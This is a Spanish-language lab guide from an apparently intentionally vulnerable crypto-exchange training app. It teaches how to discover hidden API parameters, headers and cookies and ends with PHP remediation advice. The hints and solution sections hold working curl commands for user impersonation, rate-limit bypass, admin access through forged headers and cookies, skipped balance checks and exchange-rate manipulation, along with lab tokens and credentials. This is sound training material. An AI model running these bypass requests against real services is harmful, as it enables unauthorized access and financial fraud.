# LAB 14 - Hidden Parameter Fuzzing

## Fase de la Metodologia: 4 - PARAMETER FUZZING

---

## Objetivo

Aplicar la cuarta fase del pentest de API: **descubrir parametros, headers y cookies aceptados por el servidor pero no documentados**. Esta fase es la mas subestimada y la que mas hallazgos da en pentests reales.

Tipos de parametros ocultos que el alumno debe descubrir:

1. **Query string** (`?debug=1`, `?include=*`, `?fields=*`, `?role=admin`, `?as_user_id=N`, `?bypass_rate_limit=1`)
2. **Body JSON** en POST (`fee_override`, `skip_validation`, `as_user_id`, `bypass_kyc`, `rate_override`)
3. **Headers HTTP** (`X-Debug-Token`, `X-Forwarded-For`, `X-Original-URL`, `X-Real-IP`, `X-Api-Version`, `X-Service-Token`, `X-Admin-Token`, `X-Bypass-RateLimit`)
4. **Cookies** (`debug_mode=1`, `internal_user=admin`, `feature_flags=admin_panel,debug`)

---

## Contexto

Los desarrolladores frecuentemente dejan parametros "internos" para QA, debugging o features no terminadas. Estos parametros:

- No aparecen en la documentacion publica
- No se filtran en validaciones de entrada
- Modifican el comportamiento del endpoint (mas datos, bypass de auth, dump de SQL)
- Sobreviven multiples deploys porque "no afectan" la API publica

CryptoVulnX implementa los 4 tipos en endpoints existentes para que el alumno aprenda a:

- Usar `arjun` para descubrir query params
- Usar `arjun --post` para descubrir body params
- Usar `Param Miner` (Burp) para descubrir headers
- Usar `ffuf -H "Cookie: FUZZ=1"` para descubrir cookies
- Comparar respuestas (`X-Magic-Signals` header de respuesta es una pista)

---

## Hallazgos esperados

### 4.1 - Query string params

| Endpoint | Param oculto | Efecto |
|---|---|---|
| `GET /api/v1/wallets/balance.php?wallet_id=X` | `?debug=1` | Devuelve query SQL, JWT_SECRET, thread_id |
| `GET /api/v1/wallets/balance.php?wallet_id=X` | `?include=private_key,owner,*` | Expone private_key y datos del owner |
| `GET /api/v1/wallets/balance.php` | `?as_user_id=N` | Lista wallets de OTRO user_id (impersonacion) |
| `GET /api/v1/wallets/balance.php?wallet_id=X` | `?fields=*` | Dump completo del row |
| `GET /api/v1/crypto/prices.php` | `?fields=*` | Dump de todas las columnas de crypto_prices |
| `GET /api/v1/admin/users.php` | `?role=admin` | Filtro SQLi por role |
| `POST /api/v1/auth/login.php` | `?bypass_rate_limit=1` | Salta rate limit |

### 4.2 - Headers

| Header | Valor | Efecto |
|---|---|---|
| `X-Debug-Token: 1` | cualquiera no vacio | Activa modo debug en todos los endpoints (igual que `?debug=1`) |
| `X-Bypass-RateLimit: 1` | cualquiera no vacio | Salta rate limit (igual que `?bypass_rate_limit=1`) |
| `X-Forwarded-For: 127.0.0.1` | IP interna (10/8, 192.168/16, 172.16/12, 127/8) | Saltea rate limit + activa "internal mode" + bypass admin en algunos endpoints |
| `X-Real-IP: 10.0.0.5` | idem | Idem |
| `X-Original-URL: /api/v1/admin/users` | path interno | Activa "internal mode" |
| `X-Api-Version: internal` | string `internal` | Activa "internal mode" |
| `X-Service-Token: internal_svc_token_2024_q1` | el valor exacto | Activa "internal mode" (token sacado de Fase 1 - notes.txt o backup.sql) |
| `X-Admin-Token: admin_dev_bypass_v1` | el valor exacto | Bypass de `requireAdmin()` en `/api/v1/admin/users.php` |

### 4.3 - Body JSON params (POST)

| Endpoint | Body param oculto | Efecto |
|---|---|---|
| `POST /api/v1/auth/register.php` | `role`, `kyc_verified`, `kyc_level`, `referral_bonus`, `balance` | Mass assignment - registrate como admin con KYC verificado |
| `POST /api/v1/wallets/transfer.php` | `fee_override` | Override del fee (poner 0 o negativo) |
| `POST /api/v1/wallets/transfer.php` | `skip_validation: true` | Salta verificacion de saldo |
| `POST /api/v1/wallets/transfer.php` | `as_user_id: N` | Transferir desde wallet de otro user (combina con BOLA) |
| `POST /api/v1/crypto/swap.php` | `rate_override: 999999` | Manipula tasa de cambio |
| `POST /api/v1/crypto/swap.php` | `bypass_kyc: true` | Salta verificacion KYC |
| `POST /api/v1/crypto/swap.php` | `fee_override: 0` | Sin fees |

### 4.4 - Cookies

| Cookie | Valor | Efecto |
|---|---|---|
| `debug_mode=1` | cualquiera no vacio | Modo debug global |
| `internal_user=admin` | `admin` | "internal mode" + bypass admin |
| `feature_flags=admin_panel,debug` | csv | Habilita admin_panel y debug |

---

## Herramientas Recomendadas

| Herramienta | Uso |
|---|---|
| `arjun -u <URL>` | Detectar query params validos |
| `arjun -u <URL> --get` | Idem GET |
| `arjun -u <URL> -m POST -d '{}' --headers 'Content-Type: application/json'` | Detectar body JSON params |
| `Param Miner` (Burp) | Detectar headers ocultos por reflejo de respuesta |
| `ffuf -H "FUZZ: 1"` | Brute de header names |
| `ffuf -b "FUZZ=1"` | Brute de cookie names |
| `x8` | Param mining alternativo (Rust) |
| `kiterunner` | Brute de body params en POST |
| `wfuzz` | Multi-payload fuzzing |

---

## Wordlists

```
SecLists/Discovery/Web-Content/burp-parameter-names.txt    (~6.500 nombres)
SecLists/Fuzzing/special-chars.txt
SecLists/Discovery/Web-Content/api/api-parameters.txt
PortSwigger/param-miner default wordlist
assetnote/wordlists/data/automated/parameters.txt
wordlists/cryptovulnx-magic-params.txt    (incluido)
```

`wordlists/cryptovulnx-magic-params.txt`:

```
debug
debug_mode
debug_token
include
fields
fields_filter
expand
embed
verbose
trace
test
dev
sandbox
admin
as_user
as_user_id
impersonate
bypass
bypass_auth
bypass_kyc
bypass_rate_limit
bypass_validation
skip_validation
skip_auth
skip_kyc
fee_override
rate_override
amount_override
balance_override
internal
internal_user
service_token
admin_token
master_key
api_version
feature_flags
flags
mock
fake
preview
draft
```

---

## Pistas

<details>
<summary>Pista 1 - Empezar por arjun en endpoints conocidos</summary>

```bash
TARGET=http://localhost:8080
TOKEN="<jwt-de-login>"

# Detectar query params en wallets/balance
arjun -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \
      --headers "Authorization: Bearer $TOKEN" \
      -w wordlists/cryptovulnx-magic-params.txt

# Esperado: arjun reporta debug, include, fields, as_user_id como validos
```

</details>

<details>
<summary>Pista 2 - Mirar el header X-Magic-Signals</summary>

```bash
curl -is "$TARGET/api/v1/wallets/balance.php?wallet_id=1&debug=1" \
     -H "Authorization: Bearer $TOKEN" | head -20
```

Si la respuesta tiene `X-Magic-Signals: 2`, el endpoint **respondio** a 2 magic flags. Eso es la pista de que tus params/headers fueron interpretados.

</details>

<details>
<summary>Pista 3 - Header fuzzing con Param Miner</summary>

En Burp Suite:
1. Click derecho en request -> Extensions -> Param Miner -> Guess headers
2. Esperar - reportara `X-Debug-Token`, `X-Forwarded-For`, `X-Original-URL`, `X-Api-Version`, `X-Service-Token`, `X-Admin-Token`, `X-Bypass-RateLimit`

Sin Burp, con ffuf:

```bash
# Brute de nombres de header con valor "1"
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -H "FUZZ: 1" \
     -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \
     -H "Authorization: Bearer $TOKEN" \
     -mr "X-Magic-Signals|_debug|_magic" \
     -t 30
```

</details>

<details>
<summary>Pista 4 - Body params en POST con arjun</summary>

```bash
# Detectar body params en transfer
arjun -u "$TARGET/api/v1/wallets/transfer.php" \
      -m POST -d '{"from_wallet_id":1,"to_wallet_address":"0x","amount":1}' \
      --headers "Content-Type: application/json,Authorization: Bearer $TOKEN" \
      -w wordlists/cryptovulnx-magic-params.txt
```

</details>

<details>
<summary>Pista 5 - Cookie fuzzing</summary>

```bash
ffuf -w wordlists/cryptovulnx-magic-params.txt \
     -b "FUZZ=1" \
     -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \
     -H "Authorization: Bearer $TOKEN" \
     -mr "X-Magic-Signals|_debug" \
     -t 30
```

</details>

<details>
<summary>Pista 6 - Combinar magic flags para obtener admin</summary>

```bash
# Sin token, intentar acceder a /api/v1/admin/users.php
# Combinando: X-Admin-Token + Cookie internal_user=admin + XFF interno
curl -s "$TARGET/api/v1/admin/users.php" \
     -H "X-Admin-Token: admin_dev_bypass_v1" \
     -H "X-Forwarded-For: 10.0.0.5" \
     -H "Cookie: internal_user=admin"
```

</details>

---

## Solucion Resumida

```bash
TARGET=http://localhost:8080
TOK=$(curl -s -X POST $TARGET/api/v1/auth/login.php \
        -H "Content-Type: application/json" \
        -d '{"username":"carlos","password":"carlos2024"}' | jq -r .token)

# 1. Query params - debug + include
curl -s "$TARGET/api/v1/wallets/balance.php?wallet_id=1&debug=1&include=*" \
     -H "Authorization: Bearer $TOK" | jq

# 2. Impersonacion via as_user_id
curl -s "$TARGET/api/v1/wallets/balance.php?as_user_id=4" \
     -H "Authorization: Bearer $TOK" | jq '.wallets'

# 3. Bypass rate limit en login (5 fallidos antes)
for i in {1..6}; do curl -sX POST $TARGET/api/v1/auth/login.php \
    -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'; done
# El intento 6 sera 429. Ahora con bypass:
curl -sX POST "$TARGET/api/v1/auth/login.php?bypass_rate_limit=1" \
     -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# 4. Header magico - X-Forwarded-For + X-Admin-Token
curl -s $TARGET/api/v1/admin/users.php \
     -H "X-Admin-Token: admin_dev_bypass_v1" \
     -H "X-Forwarded-For: 127.0.0.1" | jq '.users[0]'

# 5. Body param - skip_validation en transfer
curl -sX POST $TARGET/api/v1/wallets/transfer.php \
     -H "Authorization: Bearer $TOK" \
     -H "Content-Type: application/json" \
     -d '{"from_wallet_id":1,"to_wallet_address":"0xMARIA0003-BTC-VULNX","amount":99999,"skip_validation":true}'

# 6. Body param - rate_override en swap
curl -sX POST $TARGET/api/v1/crypto/swap.php \
     -H "Authorization: Bearer $TOK" \
     -H "Content-Type: application/json" \
     -d '{"from_currency":"USDT","to_currency":"BTC","amount":1,"rate_override":999999}'

# 7. Cookie - internal_user=admin
curl -s $TARGET/api/v1/admin/users.php \
     -H "Cookie: internal_user=admin" | jq '.total_users'
```

---

## Flags

```
FLAG-PARAM-01  -> ?debug=1 expone SQL en wallets/balance
FLAG-PARAM-02  -> rate_limit bypass en login
FLAG-PARAM-03  -> ?fields=* dump de columnas
FLAG-PARAM-04  -> body params ocultos en transfer
FLAG-PARAM-05  -> body params ocultos en swap
```

---

## Como esto encadena con las siguientes fases

| Hallazgo Fase 4 | Habilita en Fase... |
|---|---|
| `?debug=1` y `X-Debug-Token` | Fase 5 - todos los LABs (mas info en errores) |
| `?as_user_id` y `as_user_id` body | Fase 5 - LAB01 BOLA escalado |
| `X-Admin-Token` y `Cookie: internal_user=admin` | Fase 5 - LAB05 BFLA sin necesidad de JWT admin |
| `rate_override`, `bypass_kyc`, `fee_override` | Fase 5 - LAB06 Business Flow |
| `X-Forwarded-For`, `X-Original-URL` | Fase 5 - LAB07 SSRF |
| `?role=admin` SQLi | Fase 5 - LAB02 Broken Auth via SQLi |

---

## Remediacion

```php
// 1. Whitelist explicita de parametros aceptados por endpoint
function validateParams($input, $allowed) {
    $extra = array_diff(array_keys($input), $allowed);
    if (!empty($extra)) {
        throw new Exception('Parametros no permitidos: ' . implode(',', $extra));
    }
}

// 2. NUNCA confiar en X-Forwarded-For para identificar IP "interna"
//    Usarlo solo con LB que lo setee y filtrarlo en el LB
function getClientIPSafe() {
    return $_SERVER['REMOTE_ADDR']; // Solo esto. Punto.
}

// 3. Eliminar magic-tokens hardcoded. Usar mTLS o tokens firmados con expiracion.

// 4. Eliminar todos los `*_override`, `bypass_*`, `skip_*` - si los necesitas
//    para QA, usar un header firmado con HMAC y expiracion corta.

// 5. Headers de respuesta no deben filtrar metadata interna.
//    Eliminar X-Magic-Signals, X-Debug-Info, X-Server-Version.

// 6. Definir el contrato API en OpenAPI con additionalProperties: false
//    y validar el body con un schema validator (opis/json-schema, justinrainbow/json-schema).
```
